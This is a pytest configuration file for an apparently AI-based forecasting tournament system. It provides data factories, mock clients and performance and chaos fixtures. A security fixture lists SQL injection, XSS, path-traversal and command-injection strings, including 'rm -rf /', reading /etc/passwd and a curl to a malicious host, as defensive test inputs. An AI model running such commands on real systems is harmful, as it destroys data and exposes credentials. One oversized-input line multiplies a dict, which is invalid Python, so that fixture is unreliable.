"""Global test configuration and fixtures."""

import pytest
import asyncio
from datetime import datetime, timedelta
from typing import List, Dict, Any
from uuid import uuid4
from unittest.mock import Mock, AsyncMock

from src.domain.entities.question import Question, QuestionType, QuestionCategory, QuestionStatus
from src.domain.entities.prediction import Prediction
from src.domain.entities.tournament import Tournament, ScoringRules, ScoringMethod
from src.domain.entities.agent import Agent, ReasoningStyle
from src.domain.entities.research_report import ResearchReport
from src.domain.value_objects.confidence import Confidence
from src.domain.value_objects.reasoning_step import ReasoningStep
from src.domain.value_objects.strategy_result import StrategyResult, StrategyType
from src.domain.value_objects.source_credibility import SourceCredibility
from src.domain.value_objects.prediction_result import PredictionResult, PredictionType


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


class TestDataFactory:
    """Factory for creating test data objects."""

    @staticmethod
    def create_question(
        question_id: int = None,
        text: str = None,
        question_type: QuestionType = QuestionType.BINARY,
        category: QuestionCategory = QuestionCategory.AI_DEVELOPMENT,
        deadline_offset_days: int = 30,
        scoring_weight: float = 1.0,
        **kwargs
    ) -> Question:
        """Create a test question with sensible defaults."""
        if question_id is None:
            question_id = 1
        if text is None:
            text = f"Test question {question_id}"

        deadline = datetime.utcnow() + timedelta(days=deadline_offset_days)

        base_kwargs = {
            'id': question_id,
            'text': text,
            'question_type': question_type,
            'category': category,
            'deadline': deadline,
            'background': f"Background for question {question_id}",
            'resolution_criteria': f"Resolution criteria for question {question_id}",
            'scoring_weight': scoring_weight,
            'status': QuestionStatus.ACTIVE,
            'metadata': {'test': True}
        }

        # Add type-specific fields
        if question_type == QuestionType.NUMERIC:
            base_kwargs.update({
                'min_value': kwargs.get('min_value', 0.0),
                'max_value': kwargs.get('max_value', 100.0)
            })
        elif question_type == QuestionType.MULTIPLE_CHOICE:
            base_kwargs.update({
                'choices': kwargs.get('choices', ['A', 'B', 'C'])
            })

        base_kwargs.update(kwargs)
        return Question(**base_kwargs)

    @staticmethod
    def create_prediction(
        question_id: int = 1,
        result: Any = 0.7,
        confidence_level: float = 0.8,
        method: str = "test_method",
        created_by: str = "test_agent",
        **kwargs
    ) -> Prediction:
        """Create a test prediction with sensible defaults."""
        confidence = Confidence(level=confidence_level, basis="Test confidence basis")

        base_kwargs = {
            'id': uuid4(),
            'question_id': question_id,
            'result': result,
            'confidence': confidence,
            'method': method,
            'reasoning': f"Test reasoning for question {question_id}",
            'created_by': created_by,
            'timestamp': datetime.utcnow(),
            'metadata': {'test': True},
            'reasoning_steps': [],
            'evidence_sources': ['test_source_1', 'test_source_2']
        }

        base_kwargs.update(kwargs)
        return Prediction(**base_kwargs)

    @staticmethod
    def create_tournament(
        tournament_id: int = 1,
        name: str = None,
        questions: List[Question] = None,
        start_offset_days: int = -1,
        end_offset_days: int = 30,
        **kwargs
    ) -> Tournament:
        """Create a test tournament with sensible defaults."""
        if name is None:
            name = f"Test Tournament {tournament_id}"
        if questions is None:
            questions = [TestDataFactory.create_question(i) for i in range(1, 4)]

        start_date = datetime.utcnow() + timedelta(days=start_offset_days)
        end_date = datetime.utcnow() + timedelta(days=end_offset_days)
        scoring_rules = ScoringRules(method=ScoringMethod.BRIER_SCORE)

        base_kwargs = {
            'id': tournament_id,
            'name': name,
            'questions': questions,
            'scoring_rules': scoring_rules,
            'start_date': start_date,
            'end_date': end_date,
            'current_standings': {'agent1': 0.8, 'agent2': 0.6, 'agent3': 0.7},
            'metadata': {'test': True}
        }

        base_kwargs.update(kwargs)
        return Tournament(**base_kwargs)

    @staticmethod
    def create_agent(
        agent_id: str = "test_agent",
        name: str = None,
        reasoning_style: ReasoningStyle = ReasoningStyle.CHAIN_OF_THOUGHT,
        **kwargs
    ) -> Agent:
        """Create a test agent with sensible defaults."""
        if name is None:
            name = f"Test Agent {agent_id}"

        base_kwargs = {
            'id': agent_id,
            'name': name,
            'reasoning_style': reasoning_style,
            'knowledge_domains': ['ai_development', 'technology'],
            'performance_history': {'accuracy': 0.75, 'calibration': 0.8},
            'configuration': {'temperature': 0.7, 'max_tokens': 1000},
            'is_active': True,
            'version': '1.0.0',
            'created_at': datetime.utcnow()
        }

        base_kwargs.update(kwargs)
        return Agent(**base_kwargs)

    @staticmethod
    def create_research_report(
        question_id: int = 1,
        sources_count: int = 3,
        **kwargs
    ) -> ResearchReport:
        """Create a test research report with sensible defaults."""
        sources = [f"https://example.com/source{i}" for i in range(1, sources_count + 1)]
        credibility_scores = {source: 0.8 for source in sources}

        base_kwargs = {
            'id': uuid4(),
            'question_id': question_id,
            'sources': sources,
            'credibility_scores': credibility_scores,
            'evidence_synthesis': f"Synthesized evidence for question {question_id}",
            'base_rates': {'historical_accuracy': 0.7, 'reference_class_size': 100},
            'knowledge_gaps': ['gap1', 'gap2'],
            'research_quality_score': 0.85,
            'timestamp': datetime.utcnow()
        }

        base_kwargs.update(kwargs)
        return ResearchReport(**base_kwargs)

    @staticmethod
    def create_confidence(
        level: float = 0.8,
        basis: str = "Test confidence basis"
    ) -> Confidence:
        """Create a test confidence object."""
        return Confidence(level=level, basis=basis)

    @staticmethod
    def create_reasoning_step(
        step_number: int = 1,
        description: str = None,
        confidence_level: float = 0.8,
        **kwargs
    ) -> ReasoningStep:
        """Create a test reasoning step."""
        if description is None:
            description = f"Test reasoning step {step_number}"

        return ReasoningStep.create(
            step_number=step_number,
            description=description,
            input_data={'input': f'test_input_{step_number}'},
            output_data={'output': f'test_output_{step_number}'},
            confidence_level=confidence_level,
            confidence_basis="Test reasoning confidence",
            **kwargs
        )

    @staticmethod
    def create_strategy_result(
        strategy_type: StrategyType = StrategyType.BALANCED,
        expected_score: float = 0.7,
        question_ids: List[int] = None,
        **kwargs
    ) -> StrategyResult:
        """Create a test strategy result."""
        if question_ids is None:
            question_ids = [1, 2, 3]

        return StrategyResult.create(
            strategy_type=strategy_type,
            expected_score=expected_score,
            reasoning="Test strategy reasoning",
            question_ids=question_ids,
            confidence_level=0.8,
            confidence_basis="Test strategy confidence",
            **kwargs
        )

    @staticmethod
    def create_source_credibility(
        authority_score: float = 0.8,
        recency_score: float = 0.9,
        relevance_score: float = 0.85,
        cross_validation_score: float = 0.75
    ) -> SourceCredibility:
        """Create a test source credibility object."""
        return SourceCredibility(
            authority_score=authority_score,
            recency_score=recency_score,
            relevance_score=relevance_score,
            cross_validation_score=cross_validation_score
        )

    @staticmethod
    def create_prediction_result(
        value: Any = 0.7,
        prediction_type: PredictionType = PredictionType.BINARY,
        bounds: tuple = None
    ) -> PredictionResult:
        """Create a test prediction result."""
        return PredictionResult(
            value=value,
            prediction_type=prediction_type,
            bounds=bounds
        )


@pytest.fixture
def test_data_factory():
    """Provide the test data factory."""
    return TestDataFactory


@pytest.fixture
def sample_question(test_data_factory):
    """Provide a sample question for testing."""
    return test_data_factory.create_question()


@pytest.fixture
def sample_prediction(test_data_factory):
    """Provide a sample prediction for testing."""
    return test_data_factory.create_prediction()


@pytest.fixture
def sample_tournament(test_data_factory):
    """Provide a sample tournament for testing."""
    return test_data_factory.create_tournament()


@pytest.fixture
def sample_agent(test_data_factory):
    """Provide a sample agent for testing."""
    return test_data_factory.create_agent()


@pytest.fixture
def sample_research_report(test_data_factory):
    """Provide a sample research report for testing."""
    return test_data_factory.create_research_report()


@pytest.fixture
def mock_llm_client():
    """Provide a mock LLM client."""
    mock = AsyncMock()
    mock.generate_response.return_value = "Mock LLM response"
    mock.generate_structured_response.return_value = {"result": "mock_result"}
    return mock


@pytest.fixture
def mock_search_client():
    """Provide a mock search client."""
    mock = AsyncMock()
    mock.search.return_value = {
        'results': [
            {'title': 'Test Result 1', 'url': 'https://example.com/1', 'snippet': 'Test snippet 1'},
            {'title': 'Test Result 2', 'url': 'https://example.com/2', 'snippet': 'Test snippet 2'}
        ],
        'total': 2
    }
    return mock


@pytest.fixture
def mock_database():
    """Provide a mock database connection."""
    mock = AsyncMock()
    mock.execute.return_value = None
    mock.fetch_one.return_value = {'id': 1, 'name': 'test'}
    mock.fetch_all.return_value = [{'id': 1, 'name': 'test1'}, {'id': 2, 'name': 'test2'}]
    return mock


@pytest.fixture
def mock_cache():
    """Provide a mock cache client."""
    mock = AsyncMock()
    mock.get.return_value = None
    mock.set.return_value = True
    mock.delete.return_value = True
    mock.exists.return_value = False
    return mock


@pytest.fixture
def mock_metrics_collector():
    """Provide a mock metrics collector."""
    mock = Mock()
    mock.increment.return_value = None
    mock.gauge.return_value = None
    mock.histogram.return_value = None
    mock.timer.return_value = Mock(__enter__=Mock(), __exit__=Mock())
    return mock


class MockAsyncContextManager:
    """Mock async context manager for testing."""

    def __init__(self, return_value=None):
        self.return_value = return_value

    async def __aenter__(self):
        return self.return_value

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        pass


@pytest.fixture
def mock_async_context():
    """Provide a mock async context manager."""
    return MockAsyncContextManager


# Performance testing fixtures
@pytest.fixture
def performance_thresholds():
    """Define performance thresholds for testing."""
    return {
        'simple_question_response_time': 30.0,  # seconds
        'research_completion_time': 15.0,  # seconds
        'ensemble_aggregation_time': 60.0,  # seconds
        'strategy_optimization_time': 10.0,  # seconds
        'concurrent_questions_limit': 100,
        'tournament_questions_limit': 1000,
        'memory_limit_per_instance': 2048,  # MB
        'cpu_utilization_limit': 80.0,  # percentage
    }


@pytest.fixture
def chaos_scenarios():
    """Define chaos engineering scenarios."""
    return {
        'network_partition': {'duration': 5, 'affected_services': ['search', 'llm']},
        'high_latency': {'duration': 10, 'latency_ms': 5000},
        'memory_pressure': {'duration': 15, 'memory_limit_mb': 512},
        'cpu_spike': {'duration': 8, 'cpu_usage_percent': 95},
        'service_unavailable': {'duration': 12, 'services': ['metaculus_api']},
    }


# Security testing fixtures
@pytest.fixture
def malicious_inputs():
    """Provide malicious input samples for security testing."""
    return {
        'sql_injection': [
            "'; DROP TABLE questions; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
        ],
        'xss_payloads': [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
        ],
        'command_injection': [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl malicious.com",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        'oversized_inputs': [
            "A" * 10000,  # Large string
            {"key": "value"} * 1000,  # Large dict
            list(range(10000)),  # Large list
        ]
    }


@pytest.fixture
def security_test_credentials():
    """Provide test credentials for security testing."""
    return {
        'valid_api_key': 'test_api_key_12345',
        'invalid_api_key': 'invalid_key',
        'expired_token': 'expired_jwt_token',
        'malformed_token': 'not.a.jwt',
    }
